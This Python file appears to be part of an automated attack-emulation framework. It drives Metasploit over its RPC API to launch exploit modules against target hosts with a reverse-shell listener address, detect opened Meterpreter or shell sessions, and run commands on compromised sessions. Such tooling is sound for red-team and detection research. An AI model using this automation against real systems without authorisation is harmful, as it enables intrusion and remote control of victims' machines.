"""Metasploit RPC executor adapter.

Connects to a running ``msfrpcd`` instance via ``pymetasploit3``,
dispatches exploit modules for each ``AttackEdge``, and polls the console
for session-open or failure indicators.

Reference implementation of the execution layer described in
AttackMate (Cramer et al., 2025).
"""

from __future__ import annotations

import logging
import re
import time

from graph.models import AttackEdge, ExecutionResult
from executor.base_executor import BaseExecutor

logger = logging.getLogger(__name__)

_POLL_INTERVAL = 2.0       # seconds between console read() polls
_POLL_TIMEOUT  = 60.0      # maximum seconds to wait for exploit result
_SESSION_RE    = re.compile(r"Meterpreter session (\d+) opened")
_SHELL_RE      = re.compile(r"Command shell session (\d+) opened")


class MetasploitExecutor(BaseExecutor):
    """Execute Metasploit modules via the MSFRPC API.

    Attributes:
        attacker_ip: IP address of the Kali/attacker machine used as
            LHOST for reverse payloads.
    """

    def __init__(self, config: dict) -> None:
        """Connect to the Metasploit RPC daemon.

        Args:
            config: Dict with keys:
                - ``host`` (str): RPC server hostname. Default ``"127.0.0.1"``.
                - ``port`` (int): RPC server port. Default ``55553``.
                - ``password`` (str): RPC authentication password.
                - ``attacker_ip`` (str): LHOST for reverse shells. Default host.

        Raises:
            ConnectionError: If the RPC connection cannot be established.
        """
        from pymetasploit3.msfrpc import MsfRpcClient  # deferred import

        host = config.get("host", "127.0.0.1")
        port = int(config.get("port", 55553))
        password = config["password"]

        try:
            self.client = MsfRpcClient(
                password, server=host, port=port, ssl=False
            )
            logger.info("Connected to Metasploit RPC at %s:%d", host, port)
        except Exception as exc:
            raise ConnectionError(
                f"Cannot connect to Metasploit RPC at {host}:{port}: {exc}"
            ) from exc

        self.attacker_ip: str = config.get("attacker_ip", host)

    # ------------------------------------------------------------------
    # BaseExecutor interface
    # ------------------------------------------------------------------

    def execute_step(self, edge: AttackEdge) -> ExecutionResult:
        """Run a Metasploit exploit module for the given attack edge.

        Creates a new console, sends ``use``, ``set RHOSTS``, ``set LHOST``,
        and ``run -j``, then polls the console output until a session is
        opened, a failure is reported, or the timeout elapses.

        Args:
            edge: The attack step to execute.

        Returns:
            ``ExecutionResult`` with success flag, session ID (if opened),
            raw console output, elapsed time, and alert count.
        """
        start_time = time.time()
        output_parts: list[str] = []
        success = False
        session_id = None

        try:
            console = self.client.consoles.console()
            console_id = console.cid

            commands = [
                f"use {edge.exploit_module}\n",
                f"set RHOSTS {edge.target_host}\n",
                f"set LHOST {self.attacker_ip}\n",
                "run -j\n",
            ]
            for cmd in commands:
                console.write(cmd)
                time.sleep(0.3)

            # Poll until session opens, failure detected, or timeout.
            deadline = start_time + _POLL_TIMEOUT
            while time.time() < deadline:
                chunk = console.read()
                data: str = chunk.get("data", "") if isinstance(chunk, dict) else str(chunk)
                if data:
                    output_parts.append(data)
                    combined = "".join(output_parts)

                    # Success indicators.
                    m = _SESSION_RE.search(combined) or _SHELL_RE.search(combined)
                    if m:
                        session_id = m.group(1)
                        success = True
                        logger.info(
                            "Session %s opened on %s via %s",
                            session_id,
                            edge.target_host,
                            edge.cve_id,
                        )
                        break

                    # Failure indicators — no point waiting further.
                    if any(
                        phrase in combined
                        for phrase in (
                            "Exploit completed, but no session",
                            "Connection refused",
                            "Connection timed out",
                            "No encoders encoded",
                        )
                    ):
                        logger.warning(
                            "Exploit failed on %s (%s): %s",
                            edge.target_host,
                            edge.cve_id,
                            combined[-200:],
                        )
                        break

                time.sleep(_POLL_INTERVAL)

            # Clean up console.
            try:
                self.client.consoles.destroy(console_id)
            except Exception:
                pass

        except Exception as exc:
            logger.error("Metasploit execution error for %s: %s", edge.cve_id, exc)
            output_parts.append(f"ERROR: {exc}")

        duration = time.time() - start_time
        return ExecutionResult(
            success=success,
            session_id=session_id,
            output="\n".join(output_parts),
            duration_seconds=duration,
        )

    # ------------------------------------------------------------------
    # Additional helpers
    # ------------------------------------------------------------------

    def pivot_to(self, session_id: str, command: str, timeout: int = 30) -> str:
        """Run a command on an active Meterpreter/shell session.

        Args:
            session_id: Active session identifier.
            command: Shell command to execute on the target.
            timeout: Seconds to wait for command output.

        Returns:
            Raw command output string.
        """
        session = self.client.sessions.session(session_id)
        return session.run_with_output(command, timeout=timeout)

    def get_sessions(self) -> list[dict]:
        """Return a summary of all active Metasploit sessions.

        Returns:
            List of dicts with keys ``id``, ``type``, ``target``.
        """
        sessions = []
        try:
            for sid, info in self.client.sessions.list.items():
                sessions.append(
                    {
                        "id": sid,
                        "type": info.get("type", "unknown"),
                        "target": info.get("target_host", ""),
                    }
                )
        except Exception as exc:
            logger.warning("Could not list sessions: %s", exc)
        return sessions
